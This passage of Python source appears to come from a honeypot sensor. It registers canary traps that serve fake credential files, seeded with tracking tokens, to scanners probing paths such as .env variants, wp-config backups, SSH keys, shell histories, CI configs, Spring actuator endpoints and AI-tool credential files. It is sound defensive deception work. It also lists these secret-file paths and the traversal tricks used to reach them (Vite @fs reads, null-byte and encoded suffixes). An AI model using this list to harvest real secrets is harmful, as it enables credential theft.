        "text/plain; charset=utf-8",
    ),
    # Apache `.htpasswd` — basic-auth credential file. Scanner dictionaries
    # enumerate this alongside `.env`, `.git/config`, and other web-root
    # secrets leaks. Returning a plausible `username:$2y$10$...` line set
    # keeps the probe alive; the canary value is the *username* (cracked
    # bcrypt hash + replay against the issuer's tracking surface fires the
    # alert). Per-hit synthetic hash so the file isn't a fleet-wide
    # fingerprint.
    CanaryTrap(
        "htpasswd",
        ("/.htpasswd",),
        ("gitlab-username-password",),
        render_htpasswd,
        "text/plain; charset=utf-8",
    ),
    # `sites/default/settings.php` — Drupal 8/9 site-config file with
    # plaintext DB creds and (in many real deployments) an S3-backup
    # credential block. Scanner dictionaries walk the same backup/swap
    # suffix variants as wp-config plus the `default.settings.php`
    # template Drupal ships unconfigured. A scanner that GETs any of
    # these (or any of the webroot-prefix variants reverse proxies
    # expose under `/sites/...`) gets a fully-shaped Drupal config
    # with a per-hit DB password and a Tracebit AWS canary in the
    # `s3fs.settings` block.
    CanaryTrap(
        "drupal-settings-php",
        (
            "/sites/default/settings.php",
            # Editor-/admin-leftover suffix variants. Same shape as
            # wp-config — these survive sloppy deploys and interrupted
            # edits, and scanner dictionaries walk every plausible one.
            "/sites/default/settings.php.bak",
            "/sites/default/settings.php.save",
            "/sites/default/settings.php.swp",
            "/sites/default/settings.php.swo",
            "/sites/default/settings.php.old",
            "/sites/default/settings.php.orig",
            "/sites/default/settings.php.txt",
            "/sites/default/settings.php~",
            "/sites/default/settings.bak",
            "/sites/default/settings.old",
            "/sites/default/settings.txt",
            # Null-byte / space truncation variants. PHP's old
            # `is_file()` behaviour stopped at `%00` and some scanner
            # dictionaries probe `%00` / `%20` suffixes to find servers
            # that mis-normalise them. Decoded paths land here.
            "/sites/default/settings.php\x00",
            "/sites/default/settings.php ",
            # Drupal ships `default.settings.php` (the template) at the
            # same path. A sloppy deploy that left the template in place
            # leaks the same shape; scanners check both filenames.
            "/sites/default/default.settings.php",
            # Per-site directory variants — Drupal multisite layouts
            # use `/sites/<sitename>/settings.php`. Cover the two most
            # common conventional names.
            "/sites/all/settings.php",
            # Webroot-prefix variants — `/drupal/` and `/cms/` are the
            # two reverse-proxy layouts scanner dictionaries enumerate
            # most often for Drupal-under-subpath installs.
            "/drupal/sites/default/settings.php",
            "/cms/sites/default/settings.php",
        ),
        ("aws",),
        render_drupal_settings_php,
        "application/x-php; charset=utf-8",
    ),
    CanaryTrap(
        "wp-config",
        (
            "/wp-config.php",
            # Editor-/admin-leftover suffix variants. Scanner dictionaries
            # enumerate every plausible save/swap/comment/text shape because
            # they're what survives a sloppy deploy or an interrupted edit.
            "/wp-config.php.bak",
            "/wp-config.php.save",
            "/wp-config.php.swp",
            "/wp-config.php.swo",
            "/wp-config.php.old",
            "/wp-config.php.orig",
            "/wp-config.php.txt",
            "/wp-config.php~",
            "/wp-config.php::$DATA",  # NTFS alternate-stream syntax
            "/wp-config.bak",
            "/wp-config.old",
            "/wp-config.txt",
            "/wp-config-backup.php",
            "/backup/wp-config.php",
            # Double-encoded scanners normalize once to a still-encoded
            # path before dispatch, e.g. `%2577%2570...` -> `%77%70...`.
            "/%77%70%2d%63%6f%6e%66%69%67.%70%68%70.%62%61%6b",
        ),
        ("aws",),
        render_wp_config_php,
        "application/x-php; charset=utf-8",
    ),
    CanaryTrap(
        "sql-dump",
        ("/backup.sql", "/db.sql", "/dump.sql", "/database.sql", "/backup/db.sql", "/sql/backup.sql"),
        ("aws",),
        render_sql_dump,
        "application/sql; charset=utf-8",
    ),
    CanaryTrap(
        "config-json",
        ("/config.json", "/settings.json", "/credentials.json", "/secrets.json"),
        ("aws",),
        render_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "sftp-config",
        (
            # VS Code Liximomo/SFTP extension
            "/.vscode/sftp.json",
            # Sublime SFTP — single-file project root variant
            "/sftp-config.json",
            # Sibling of `.git/`-as-deploy-source: scanners enumerate the
            # file at the project root regardless of editor.
            "/sftp.json",
            "/.ftpconfig",
        ),
        ("gitlab-username-password",),
        render_sftp_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "firebase-json",
        (
            "/firebase.json", "/google-services.json",
            "/serviceaccount.json", "/service-account.json",
            # Firebase Admin SDK + GCP service-account key file names that
            # multi-platform credential scanners enumerate alongside the
            # GCP path family below.
            "/firebase-adminsdk.json", "/gcp-service-account.json",
            # GCP gcloud CLI Application Default Credentials JSON. The
            # gcloud CLI also stores credentials in `credentials.db` /
            # `access_tokens.db` (SQLite) at the same path; we don't serve
            # those because a malformed SQLite is more revealing than a
            # 404, but the JSON sibling is the most replay-valuable file.
            "/.config/gcloud/application_default_credentials.json",
        ),
        ("aws",),
        render_firebase_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "docker-config",
        (
            "/.docker/config.json",
            "/docker/config.json",
            # Webroot-prefix variants — same pattern as ssh-private-key.
            "/root/.docker/config.json",
            "/home/.docker/config.json",
        ),
        ("aws",),
        render_docker_config,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "docker-compose",
        (
            "/docker-compose.yml", "/docker-compose.yaml",
            "/compose.yml", "/compose.yaml",
            # Environment-suffixed variants observed in scanner dictionaries —
            # typical deploys ship separate compose files per env and scanners
            # enumerate the obvious ones.
            "/docker-compose.prod.yml", "/docker-compose.prod.yaml",
            "/docker-compose.production.yml", "/docker-compose.production.yaml",
            "/docker-compose.dev.yml", "/docker-compose.dev.yaml",
            "/docker-compose.staging.yml", "/docker-compose.staging.yaml",
            "/docker-compose.override.yml", "/docker-compose.override.yaml",
        ),
        ("aws",),
        render_docker_compose_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "github-actions-workflow",
        (
            "/.github/workflows/deploy.yml",
            "/.github/workflows/deploy.yaml",
            "/.github/workflows/main.yml",
            "/.github/workflows/main.yaml",
            "/.github/workflows/ci.yml",
            "/.github/workflows/ci.yaml",
            "/.github/workflows/build.yml",
            "/.github/workflows/build.yaml",
            "/.github/workflows/test.yml",
            "/.github/workflows/test.yaml",
            "/.github/workflows/docker.yml",
            "/.github/workflows/docker.yaml",
            "/.github/workflows/release.yml",
            "/.github/workflows/release.yaml",
            "/.github/workflows/cd.yml",
            "/.github/workflows/cd.yaml",
        ),
        ("aws",),
        render_github_actions_workflow,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "gitlab-ci",
        ("/.gitlab-ci.yml", "/.gitlab-ci.yaml", "/.gitlab/.gitlab-ci.yml"),
        ("aws",),
        render_gitlab_ci_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "jenkinsfile",
        ("/jenkinsfile", "/jenkinsfile.bak"),
        ("aws",),
        render_jenkinsfile,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "bitbucket-pipelines",
        ("/bitbucket-pipelines.yml", "/bitbucket-pipelines.yaml"),
        ("aws",),
        render_bitbucket_pipelines_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "generic-ci-config",
        (
            "/appveyor.yml",
            "/appveyor.yaml",
            "/.circleci/config.yml",
            "/.circleci/config.yaml",
            "/azure-pipelines.yml",
            "/azure-pipelines.yaml",
            "/deployment.yml",
            "/deployment.yaml",
            "/deploy.yml",
            "/deploy.yaml",
            "/drone.yml",
            "/.drone.yml",
        ),
        ("aws",),
        render_generic_ci_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "application-properties",
        ("/application.properties",),
        ("aws",),
        render_application_properties,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "application-yml",
        ("/application.yml", "/application.yaml"),
        ("aws",),
        render_application_yml,
        "application/yaml; charset=utf-8",
    ),
    # Spring Boot Actuator `/env` endpoint. A Spring app exposing
    # `management.endpoints.web.exposure.include=*` serves the full
    # environment — system env vars, JVM props, application.yml values —
    # as JSON. Scanners hunt this path specifically because it returns
    # raw `spring.datasource.password` and `AWS_SECRET_ACCESS_KEY` values
    # in one response. Path aliases cover the legacy 1.x actuator
    # (`/env`), common `management.endpoints.web.base-path` overrides
    # (`/manage`, `/management`), and a `/api`-prefixed reverse-proxy
    # shape.
    CanaryTrap(
        "actuator-env",
        (
            "/actuator/env",
            "/actuator/env.json",
            "/env",
            "/manage/env",
            "/management/env",
            "/api/actuator/env",
        ),
        ("aws",),
        render_actuator_env_json,
        "application/vnd.spring-boot.actuator.v3+json; charset=utf-8",
    ),
    # Spring Boot Actuator surface beyond /env. Each endpoint is grepped
    # by the same broad-secrets fleets that hit /actuator/env: a 200 with
    # the right JSON / HPROF shape passes the scanner's filter, the
    # embedded canary credential gets harvested. Path aliases follow the
    # `/manage`, `/management`, `/api/actuator` reverse-proxy shapes
    # already covered by actuator-env.
    CanaryTrap(
        "actuator-heapdump",
        (
            "/actuator/heapdump",
            "/manage/heapdump",
            "/management/heapdump",
            "/api/actuator/heapdump",
        ),
        ("aws",),
        render_actuator_heapdump,
        "application/octet-stream",
    ),
    CanaryTrap(
        "actuator-configprops",
        (
            "/actuator/configprops",
            "/manage/configprops",
            "/management/configprops",
            "/api/actuator/configprops",
        ),
        ("aws",),
        render_actuator_configprops,
        "application/vnd.spring-boot.actuator.v3+json; charset=utf-8",
    ),
    CanaryTrap(
        "actuator-health",
        (
            "/actuator/health",
            "/manage/health",
            "/management/health",
            "/api/actuator/health",
        ),
        ("aws",),
        render_actuator_health,
        "application/vnd.spring-boot.actuator.v3+json; charset=utf-8",
    ),
    CanaryTrap(
        "actuator-mappings",
        (
            "/actuator/mappings",
            "/manage/mappings",
            "/management/mappings",
            "/api/actuator/mappings",
        ),
        ("aws",),
        render_actuator_mappings,
        "application/vnd.spring-boot.actuator.v3+json; charset=utf-8",
    ),
    CanaryTrap(
        "actuator-threaddump",
        (
            "/actuator/threaddump",
            "/manage/threaddump",
            "/management/threaddump",
            "/api/actuator/threaddump",
        ),
        ("aws",),
        render_actuator_threaddump,
        "application/vnd.spring-boot.actuator.v3+json; charset=utf-8",
    ),
    CanaryTrap(
        "env-production",
        (
            # The canonical production / prod / live triple — the names
            # scanners and operators agree mean "the file with real
            # secrets in it".
            "/.env.production",
            "/.env.prod",
            "/.env.live",
            # Dev/test/staging/ci sibling files. Scanner dictionaries
            # walk the full set, so a 200 on `.env.production` and a 404
            # on `.env.local` / `.env.dev` is itself a fingerprint of a
            # hand-rolled fake. Same render shape on every variant — a
            # harvester greps for `AWS_ACCESS_KEY_ID=` and walks away
            # with the canary regardless of which sibling it hit.
            "/.env.local",
            "/.env.dev",
            "/.env.development",
            "/.env.development.local",
            "/.env.test",
            "/.env.test.local",
            "/.env.staging",
            "/.env.example",
            "/.env.example.local",
            "/.env.ci",
            "/.env.save",
            "/.env.private",
            "/.env.docker",
            "/.env.override",
            "/.env2",
            # Underscore-separated backup variants used by the
            # off-the-shelf "EnvChecker"-shaped dictionaries that hit
            # the bare-dotfile + every common rotation-name in one
            # sweep. Without these, a scanner with this dictionary
            # collects 1 canary (`/.env`) instead of 6.
            "/.env_bak",
            "/.env_old",
            "/.env_orig",
            "/.env_priv",
            "/.env_example",
            # `/.environ` (no separator at all) is a niche but
            # recurring entry in newer harvester dictionaries.
            "/.environ",
            # Webroot-prefix `.env` variants — scanners walking the
            # `/<app-root>/.env` pattern. `/mailer/.env` was the
            # original prefix; `/opt/.env` and the FHS-canonical app
            # roots (`/srv`, `/var/www`, `/app`) extend the same
            # shape. Same render — every harvester greps for the
            # canary triple regardless of where the file lives.
            "/mailer/.env",
            "/opt/.env",
            "/srv/.env",
            "/var/www/.env",
            "/app/.env",
        ),
        ("aws",),
        render_env_production,
        "text/plain; charset=utf-8",
    ),
    *(
        CanaryTrap(
            "mail-service-env",
            (p,),
            ("aws",),
            _render_mail_service_env_for(p),
            "text/plain; charset=utf-8",
        )
        for p in _MAIL_SERVICE_PATH_MAP
    ),
    # `~/.bash_history` — shell-history harvest. Scanner dictionaries
    # walk every plausible home-dir webroot leak (`/root/.bash_history`,
    # `/home/<user>/.bash_history`) plus Vite dev-server path-traversal
    # variants (`/@fs/root/.bash_history`, `/@fs/home/node/.bash_history`)
    # that exploit Vite's `@fs/` arbitrary-file-read primitive. The body
    # is a synthetic recent-shell session where the operator pasted
    # `export AWS_ACCESS_KEY_ID=...` mid-session and `aws s3 cp ...` ran
    # afterwards — a credible "history captured during a credential
    # paste" shape. Per-hit random PR number / commit SHA / DB password
    # / S3 object key prevent the body becoming a cross-sensor
    # fingerprint.
    CanaryTrap(
        "bash-history",
        (
            "/.bash_history",
            # Webroot-prefix variants — common scanner pattern, mirrors
            # the ssh-private-key / docker-config trap families.
            "/root/.bash_history",
            "/home/.bash_history",
            "/home/ubuntu/.bash_history",
            "/home/ec2-user/.bash_history",
            "/home/admin/.bash_history",
            "/home/node/.bash_history",
            "/home/www-data/.bash_history",
            "/home/deploy/.bash_history",
            # Vite dev-server `@fs/` arbitrary-file-read primitive. The
            # `/@fs/<absolute-path>` shape is Vite's filesystem
            # passthrough; scanners that already probe `/@vite/env`
            # often follow up with `/@fs/root/.bash_history` etc.
            "/@fs/root/.bash_history",
            "/@fs/home/.bash_history",
            "/@fs/home/ubuntu/.bash_history",
            "/@fs/home/ec2-user/.bash_history",
            "/@fs/home/node/.bash_history",
        ),
        ("aws",),
        render_bash_history,
        "text/plain; charset=utf-8",
    ),
    # `~/.zsh_history` sibling — same canary placement, but written in
    # zsh's `EXTENDED_HISTORY` `: <ts>:<elapsed>;<cmd>` format. A
    # harvester that filters on the bash shape rejects this; one
    # parsing for the zsh-specific prefix accepts it. Per-hit random
    # timestamps + DB password keep the body unique.
    CanaryTrap(
        "zsh-history",
        (
            "/.zsh_history",
            "/root/.zsh_history",
            "/home/.zsh_history",
            "/home/ubuntu/.zsh_history",
            "/home/ec2-user/.zsh_history",
            "/home/node/.zsh_history",
            "/@fs/root/.zsh_history",
            "/@fs/home/node/.zsh_history",
        ),
        ("aws",),
        render_zsh_history,
        "text/plain; charset=utf-8",
    ),
    # `.env.vault` is the dotenv-vault file format. The renderer
    # reproduces a sloppy commit shape — encrypted vault entries plus
    # a plaintext fallback block left at the bottom — so an
    # opportunistic harvester walks away with the canary AWS creds.
    CanaryTrap(
        "env-vault",
        (
            "/.env.vault",
            "/.env.vault.bak",
            "/.env.vault.example",
        ),
        ("aws",),
        render_env_vault,
        "text/plain; charset=utf-8",
    ),
    # Go `net/http/pprof` debug endpoints. `/debug/pprof/heap` and
    # `/debug/pprof/cmdline` are the highest-value scanner targets
    # because a process whose memory + cmdline contain live AWS
    # creds turns an exposed pprof endpoint into a one-shot leak.
    # All paths share one renderer (plaintext heap-profile shape
    # with embedded env block) — harvesters grep raw bytes, the
    # exact pprof endpoint shape doesn't matter.
    CanaryTrap(
        "pprof-dump",
        (
            "/debug/pprof",
            "/debug/pprof/",
            "/debug/pprof/heap",
            "/debug/pprof/cmdline",
            "/debug/pprof/goroutine",
            "/debug/pprof/profile",
            "/debug/pprof/symbol",
            "/debug/pprof/trace",
            "/debug/pprof/threadcreate",
            "/debug/pprof/block",
            "/debug/pprof/mutex",
            "/debug/pprof/allocs",
            # Reverse-proxy-prefixed variants (Go services behind a
            # `/api`-rooted ingress) — same shape, same render.
            "/api/debug/pprof",
            "/api/debug/pprof/",
            "/api/debug/pprof/heap",
            "/api/debug/pprof/cmdline",
            "/api/debug/pprof/goroutine",
            "/api/debug/pprof/profile",
            "/api/debug/pprof/allocs",
        ),
        ("aws",),
        render_pprof_dump,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "phpinfo",
        ("/phpinfo.php", "/info.php", "/php.php", "/test.php"),
        ("aws",),
        render_phpinfo,
        "text/html; charset=utf-8",
    ),
    CanaryTrap(
        "ssh-private-key",
        (
            "/id_rsa",
            "/.ssh/id_rsa",
            "/ssh/id_rsa",
            "/ssh/id_rsa.key",
            "/keys/id_rsa",
            "/private.key",
            "/deploy_key",
            "/deploy.key",
            # Tracebit issues ed25519, so the id_ed25519 filename is the
            # most literal match; id_dsa / id_ecdsa covered because
            # scanner dictionaries probe every algo by convention.
            "/.ssh/id_ed25519",
            "/.ssh/id_dsa",
            "/.ssh/id_ecdsa",
            "/id_ed25519",
            "/id_dsa",
            "/id_ecdsa",
            # `/root/.ssh/id_rsa` and `/home/.ssh/id_rsa` are common
            # path-prefix variants — scanners hunt for home-dir leakage
            # below a misconfigured webroot.
            "/root/.ssh/id_rsa",
            "/home/.ssh/id_rsa",
        ),
        ("ssh",),
        render_ssh_private_key,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "ssh-public-key",
        ("/id_rsa.pub", "/.ssh/id_rsa.pub"),
        ("ssh",),
        render_ssh_public_key,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "ssh-config",
        ("/.ssh/config",),
        ("ssh",),
        render_ssh_config,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "known-hosts",
        ("/.ssh/known_hosts", "/known_hosts"),
        ("ssh",),
        render_known_hosts,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "authorized-keys",
        (
            "/authorized_keys",
            "/.ssh/authorized_keys",
            "/.ssh/authorized_keys2",
            # Webroot-prefix variants — common scanner pattern where a
            # directory (e.g. the CMS upload area) is assumed to sit atop
            # an unexpected ``.ssh/`` leak.
            "/static/.ssh/authorized_keys",
            "/downloads/.ssh/authorized_keys",
            "/blog/.ssh/authorized_keys",
        ),
        ("ssh",),
        render_authorized_keys,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "netrc",
        ("/.netrc", "/_netrc"),
        ("gitlab-username-password",),
        render_netrc,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "git-credentials",
        # `/root/.git-credentials` + `/home/.git-credentials` mirror the
        # ssh-private-key webroot-prefix variants — observed in scanner
        # dictionaries probing for home-dir leakage below misconfigured
        # webroots.
        (
            "/.git-credentials",
            "/root/.git-credentials",
            "/home/.git-credentials",
        ),
        ("gitlab-username-password",),
        render_git_credentials,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "npmrc",
        # Webroot-prefix variants (`/root/.npmrc`, `/home/.npmrc`) are
        # observed in scanner dictionaries alongside the bare `/.npmrc`
        # — same pattern as the ssh-private-key trap. Without the
        # prefixed variants they 404.
        (
            "/.npmrc",
            "/root/.npmrc",
            "/home/.npmrc",
        ),
        ("gitlab-username-password",),
        render_npmrc,
        "text/plain; charset=utf-8",
    ),
    # Node.js dependency-manifest set. yarn.lock + package-lock.json +
    # package.json + .yarnrc[.yml] are pulled together by scanners
    # harvesting Node.js codebases; the resolved-URL userinfo is the
    # high-signal piece, so every URL carries the
    # gitlab-username-password canary.
    CanaryTrap(
        "yarn-lock",
        (
            "/yarn.lock",
            "/yarn.lock.bak",
            "/yarn.lock.old",
        ),
        ("gitlab-username-password",),
        render_yarn_lock,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "package-lock-json",
        (
            "/package-lock.json",
            "/package-lock.json.bak",
            "/package-lock.json.old",
            "/var/backups/npm/package-lock.json.old",
        ),
        ("gitlab-username-password",),
        render_package_lock_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "package-json",
        ("/package.json",),
        ("gitlab-username-password",),
        render_package_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "yarnrc",
        ("/.yarnrc",),
        ("gitlab-username-password",),
        render_yarnrc,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "yarnrc-yml",
        ("/.yarnrc.yml",),
        ("gitlab-username-password",),
        render_yarnrc_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "pypirc",
        ("/.pypirc",),
        ("gitlab-username-password",),
        render_pypirc,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "gitlab-api-user",
        ("/api/v4/user",),
        ("gitlab-username-password",),
        render_gitlab_api_user,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "gitlab-sign-in",
        ("/users/sign_in",),
        ("gitlab-cookie",),
        render_gitlab_sign_in,
        "text/html; charset=utf-8",
        extra_headers=_gitlab_cookie_header,
    ),
    # Heroku / .NET / IIS / PHP-Composer / Docker source-file canary
    # set. Each file currently falls through to default 404; access
    # logs show steady demand from multiple actor populations
    # (config-leak harvesters + the terraform-state-hunter family
    # that added Heroku-shaped paths to its dictionary). Scanner
    # dictionaries grep for `AWS_ACCESS_KEY_ID=` / `accessKey:` etc;
    # we land the canary in every one of those slots.
    CanaryTrap(
        "procfile",
        ("/procfile",),
        ("aws",),
        render_procfile,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "heroku-yml",
        ("/heroku.yml", "/heroku.yaml"),
        ("aws",),
        render_heroku_yml,
        "application/yaml; charset=utf-8",
    ),
    CanaryTrap(
        "heroku-app-json",
        ("/app.json",),
        ("aws",),
        render_heroku_app_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "appsettings-json",
        (
            "/appsettings.json",
            "/appsettings.production.json",
            "/appsettings.development.json",
            "/appsettings.staging.json",
            "/appsettings.local.json",
        ),
        ("aws",),
        render_appsettings_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "iis-web-config",
        (
            "/web.config",
            # Webroot-prefix variants. Real IIS scanner dictionaries
            # walk the file at `/<app-root>/Web.config` too.
            "/web.config.bak",
            "/web.config.old",
            "/web.config.orig",
            "/web.config.save",
        ),
        ("aws",),
        render_iis_web_config,
        "application/xml; charset=utf-8",
    ),
    CanaryTrap(
        "composer-auth-json",
        ("/auth.json",),
        ("gitlab-username-password",),
        render_composer_auth_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "dockerfile",
        (
            "/dockerfile",
            "/dockerfile.prod",
            "/dockerfile.production",
            "/dockerfile.dev",
            "/dockerfile.development",
            "/dockerfile.local",
            "/dockerfile.staging",
            "/dockerfile.worker",
            "/dockerfile.build",
            "/containerfile",
        ),
        ("aws",),
        render_dockerfile,
        "text/plain; charset=utf-8",
    ),
    # AI credential config files. See the big comment above
    # render_openai_config_json for the "this probably doesn't make sense
    # yet" caveat — we're logging the probe now, and will swap in real LLM
    # canaries when Tracebit ships them.
    CanaryTrap(
        "openai-config",
        ("/.openai/config.json",),
        ("aws",),
        render_openai_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "anthropic-config",
        ("/.anthropic/config.json",),
        ("aws",),
        render_anthropic_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "cursor-mcp",
        ("/.cursor/mcp.json",),
        ("aws",),
        render_cursor_mcp_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "claude-credentials",
        ("/.claude/.credentials.json",),
        ("aws",),
        render_claude_credentials_json,
        "application/json; charset=utf-8",
    ),
    # AI editor / coding-assistant config files. See the comment block
    # above render_claude_settings_json for the late-April-2026 expansion
    # rationale and the same "no Tracebit LLM canary type yet" caveat.
    CanaryTrap(
        "claude-settings",
        ("/.claude/settings.json",),
        ("aws",),
        render_claude_settings_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "cline-settings",
        ("/.cline/settings.json",),
        ("aws",),
        render_cline_settings_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "mcp-config",
        (
            "/.cline/mcp_settings.json",
            "/mcp_settings.json",
            "/mcp.json",
            "/.mcp/mcp.json",
        ),
        ("aws",),
        render_cursor_mcp_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "continue-config",
        ("/.continue/config.json",),
        ("aws",),
        render_continue_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "cody-config",
        ("/.sourcegraph/cody.json",),
        ("aws",),
        render_cody_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "aider-conf",
        ("/.aider.conf.yml",),
        ("aws",),
        render_aider_conf_yml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "open-interpreter-config",
        ("/.config/open-interpreter/config.yaml",),
        ("aws",),
        render_open_interpreter_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    # AI infrastructure / proxy / framework configs.
    CanaryTrap(
        "litellm-config",
        (
            "/litellm_config.yaml",
            "/litellm/config.yaml",
            "/proxy_config.yaml",
        ),
        ("aws",),
        render_litellm_config_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "langsmith-env",
        ("/langsmith.env",),
        ("aws",),
        render_langsmith_env,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "huggingface-token",
        ("/.huggingface/token", "/.cache/huggingface/token"),
        ("aws",),
        render_huggingface_token,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "streamlit-secrets",
        ("/.streamlit/secrets.toml",),
        ("aws",),
        render_streamlit_secrets_toml,
        "application/toml; charset=utf-8",
    ),
    CanaryTrap(
        "openai-config-flat",
        ("/openai.json",),
        ("aws",),
        render_openai_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "anthropic-config-flat",
        ("/anthropic.json",),
        ("aws",),
        render_anthropic_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "ai-provider-config",
        (
            "/cohere_config.json",
            "/tabnine_config.json",
            "/.bito/config.json",
            "/.codeium/config.json",
            "/.roost/config.json",
            "/pinecone_config.json",
            "/.lobechat/config.json",
            "/chatgpt-next-web.json",
        ),
        ("aws",),
        render_generic_ai_api_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "baseten-config",
        ("/baseten.yaml",),
        ("aws",),
        render_baseten_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    # AI-IDE credential dictionary expansion (May 2026). See comment block
    # above `render_codex_auth_json` for context.
    CanaryTrap(
        "codex-auth",
        ("/.codex/auth.json", "/root/.codex/auth.json"),
        ("aws",),
        render_codex_auth_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "gemini-oauth-creds",
        ("/.gemini/oauth_creds.json", "/root/.gemini/oauth_creds.json"),
        ("aws",),
        render_gemini_oauth_creds_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "gemini-settings",
        ("/.gemini/settings.json", "/root/.gemini/settings.json"),
        ("aws",),
        render_gemini_settings_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "ai-ide-rules",
        ("/.cursorrules", "/.clinerules", "/.windsurfrules"),
        ("aws",),
        render_ai_rules_text,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "cursor-state-vscdb",
        ("/.cursor/user/globalstorage/state.vscdb",),
        ("aws",),
        render_cursor_state_vscdb,
        "application/octet-stream",
    ),
    CanaryTrap(
        "dashscope-api-key",
        ("/.dashscope/api_key",),
        ("aws",),
        render_plain_canary_api_key,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "anthropic-api-key",
        ("/.anthropic/api_key",),
        ("aws",),
        render_plain_canary_api_key,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "deepseek-config",
        ("/.deepseek/config.json",),
        ("aws",),
        render_deepseek_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "kimi-credentials",
        (
            "/.kimi/credentials/kimi-code.json",
            "/.kimi/kimi-code.json",
            "/.moonshot/settings.json",
        ),
        ("aws",),
        render_kimi_credentials_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "openclaw-config",
        ("/.openclaw/openclaw.json", "/root/.openclaw/openclaw.json"),
        ("aws",),
        render_openclaw_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "opencode-config",
        ("/root/.config/opencode/config.json",),
        ("aws",),
        render_opencode_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "vastai-credentials",
        ("/root/.config/vastai/credentials.json",),
        ("aws",),
        render_vastai_credentials_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "nerve-config",
        ("/root/.nerve/config.yaml",),
        ("aws",),
        render_nerve_config_yaml,
        "application/x-yaml; charset=utf-8",
    ),
    CanaryTrap(
        "spawnrc",
        ("/root/.spawnrc",),
        ("aws",),
        render_spawnrc,
        "text/plain; charset=utf-8",
    ),
    CanaryTrap(
        "moltbook-credentials",
        ("/root/.config/moltbook/credentials.json",),
        ("aws",),
        render_moltbook_credentials_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "claude-config",
        (
            "/.claude.json",
            "/root/.claude.json",
            "/.claude/config.json",
            "/.claude/settings.local.json",
        ),
        ("aws",),
        render_claude_config_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "claude-history",
        ("/.claude/history.jsonl",),
        ("aws",),
        render_claude_history_jsonl,
        "application/x-ndjson; charset=utf-8",
    ),
    CanaryTrap(
        "claude-credentials-root",
        ("/root/.claude/.credentials.json",),
        ("aws",),
        render_claude_credentials_json,
        "application/json; charset=utf-8",
    ),
    CanaryTrap(
        "agents-md",
        (
            "/agents.md",
            "/.claude/claude.md",
            "/root/.claude/claude.md",
        ),
        ("aws",),
        render_agents_md,
        "text/markdown; charset=utf-8",
    ),
    CanaryTrap(
        "symfony-profiler-phpinfo",
        (
            # Symfony Web Profiler phpinfo() leak — dev mode left on. Each
            # entry corresponds to a real-world rewrite-rule placement
            # (`/_profiler/...`, `/app_dev.php/_profiler/...`, etc.).
            "/_profiler/phpinfo",
            "/_profiler/phpinfo.php",
            "/_profiler/phpinfo/",
            "/app_dev.php/_profiler/phpinfo",
            "/app_dev.php/_profiler/phpinfo.php",
            "/app_dev.php/_profiler/phpinfo/",
            "/symfony/_profiler/phpinfo",
            "/symfony/_profiler/phpinfo.php",
            "/frontend_dev.php/_profiler/phpinfo",
            "/frontend_dev.php/_profiler/phpinfo.php",
        ),
        ("aws",),
        render_symfony_profiler_phpinfo,
